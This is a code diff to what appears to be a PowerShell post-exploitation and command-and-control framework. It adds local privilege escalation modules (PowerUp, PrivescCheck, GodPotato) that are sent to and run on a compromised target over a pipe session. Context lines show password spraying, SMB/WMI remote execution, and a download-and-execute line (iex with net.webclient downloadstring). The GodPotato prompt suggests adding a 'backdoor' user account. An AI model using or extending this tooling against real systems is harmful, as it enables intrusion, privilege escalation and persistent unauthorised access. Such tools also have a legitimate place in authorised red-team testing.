@@ -1811,6 +1811,10 @@ function Start-LocalShell {
         'Remoting'         = @{ tools=@('Invoke-SMBRemoting','Invoke-WMIRemoting');             invoke=$null }
         'SessionHunter'    = @{ tools=@('Invoke-SessionHunter');                                 invoke=$null }
         'PsMapExec'        = @{ tools=@('PsMapExec');                                            invoke=$null }
+        # LPE
+        'PowerUp'          = @{ tools=@('PowerUp');          invoke='Invoke-AllChecks' }
+        'PrivescCheck'     = @{ tools=@('PrivescCheck');      invoke='Invoke-PrivescCheck' }
+        'GodPotato'        = @{ tools=@('Invoke-GodPotato'); invoke=$null }
     }
 
     Write-Output ""
@@ -1891,6 +1895,11 @@ function Start-LocalShell {
             Write-Host "   Remoting          " -NoNewline -ForegroundColor Yellow; Write-Host "Remote command execution SMB/WMI - use: Invoke-SMBRemoting / Invoke-WMIRemoting"
             Write-Host "   SessionHunter     " -NoNewline -ForegroundColor Yellow; Write-Host "Hunt for active user sessions"
             Write-Host "   PsMapExec         " -NoNewline -ForegroundColor Yellow; Write-Host "Network attacks/mapping - use: PsMapExec <Method> -Targets <targets> [-Domain <domain>]"
+            Write-Output ""
+            Write-Host " [+] LPE:" -ForegroundColor Green
+            Write-Host "   PowerUp           " -NoNewline -ForegroundColor Yellow; Write-Host "Run Invoke-AllChecks (PowerUp privilege escalation checks)"
+            Write-Host "   PrivescCheck      " -NoNewline -ForegroundColor Yellow; Write-Host "Run Invoke-PrivescCheck (comprehensive LPE audit)"
+            Write-Host "   GodPotato         " -NoNewline -ForegroundColor Yellow; Write-Host "Load GodPotato -- use: Invoke-GodPotato -cmd ""cmd /c whoami"""
             Write-Output ""
             Write-Host " [*] Scenario 1: started via 'runas /netonly', all domain tools" -ForegroundColor DarkCyan
             Write-Host "     (PowerView, SessionHunter, PassSpray, etc.) automatically use" -ForegroundColor DarkCyan
@@ -3552,7 +3561,50 @@ function InteractWithPipeSession{
 			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SessionHunter.ps1')")
 			$sw.Flush()
 		}
-		
+
+		elseif ($command -eq 'PowerUp') {
+			Write-Output ""
+			Write-Output " [+] Sending PowerUp to target..."
+			if (Send-Module -ToolName 'PowerUp' -Writer $sw -Reader $sr) {
+				Write-Output " [+] PowerUp loaded -- running Invoke-AllChecks"
+				Write-Output ""
+				$sw.WriteLine("Invoke-AllChecks")
+				$sw.Flush()
+			} else {
+				Write-Output " [-] PowerUp not in cache. Add PowerUp.ps1 to Tools\ and run: modules reload"
+			}
+		}
+
+		elseif ($command -eq 'PrivescCheck') {
+			Write-Output ""
+			Write-Output " [+] Sending PrivescCheck to target..."
+			if (Send-Module -ToolName 'PrivescCheck' -Writer $sw -Reader $sr) {
+				Write-Output " [+] PrivescCheck loaded -- running Invoke-PrivescCheck"
+				Write-Output ""
+				$sw.WriteLine("Invoke-PrivescCheck")
+				$sw.Flush()
+			} else {
+				Write-Output " [-] PrivescCheck not in cache. Add PrivescCheck.ps1 to Tools\ and run: modules reload"
+			}
+		}
+
+		elseif ($command -eq 'GodPotato') {
+			Write-Output ""
+			[Console]::Write(" GodPotato command to run (e.g. cmd /c net user backdoor P@ss123 /add): ")
+			$gpCmd = Read-Host
+			if ($gpCmd) {
+				Write-Output " [+] Sending GodPotato to target..."
+				if (Send-Module -ToolName 'Invoke-GodPotato' -Writer $sw -Reader $sr) {
+					Write-Output " [+] GodPotato loaded -- executing: $gpCmd"
+					Write-Output ""
+					$sw.WriteLine("Invoke-GodPotato -cmd `"$gpCmd`"")
+					$sw.Flush()
+				} else {
+					Write-Output " [-] GodPotato not in cache. Add Invoke-GodPotato.ps1 to Tools\ and run: modules reload"
+				}
+			}
+		}
+
 		elseif ($command -like "help") {
 			Get-AvailableCommands
 			continue
@@ -6614,6 +6666,13 @@ function Get-AvailableCommands  {
 	Write-Output " PassSpray          Domain Password Spray"
 	Write-Output " Remoting           Remote Command Execution SMB|WMI|WinRM"
 	Write-Output " SessionHunter      Hunt for Active User Sessions"
+	Write-Output ""
+	Write-Output ""
+	Write-Host " [+] LPE:" -Foreground cyan
+	Write-Output ""
+	Write-Output " PowerUp            Run Invoke-AllChecks (PowerUp)"
+	Write-Output " PrivescCheck       Run Invoke-PrivescCheck"
+	Write-Output " GodPotato          Load GodPotato (prompts for command)"
 	Write-Output ""
 	Write-Output ""
 }
